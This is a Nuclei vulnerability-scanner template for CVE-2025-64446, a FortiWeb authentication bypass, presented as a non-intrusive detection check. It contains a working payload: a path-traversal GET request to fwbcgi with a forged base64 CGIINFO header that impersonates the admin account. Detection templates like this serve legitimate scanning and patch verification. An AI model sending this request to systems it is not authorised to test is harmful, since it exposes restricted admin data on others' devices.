id: CVE-2025-64446

info:
  name: CVE-2025-64446 FortiWeb Authentication Bypass
  author: Jerome Fellus
  severity: critical
  description: |
    Sends a non-intrusive HTTP GET request to fwbcgi, using relative path traversal to bypass authentication
    and retrieve information that should be restricted to admin.
    Contrarily to existing Nuclei templates, this one doesn't submit POST requests that create a new admin user,
    making it non-intrusive and safe to run in production environments.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-25-192
    - https://nvd.nist.gov/vuln/detail/CVE-2025-64446
  tags: cve,fortinet,fortiweb,auth-bypass,critical,path-traversal,non-intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi?json=1"
    headers:
      User-Agent: VulnScanner/0.1
      # GGIINFO header crafted from base64.b64encode(json.dumps(
      #     {
      #        "username": "admin",
      #        "profname": "prof_admin",
      #        "vdom": "root",
      #        "loginname": "admin",
      #     }
      # ).encode()))
      CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
        - "admin"

    matchers-condition: and
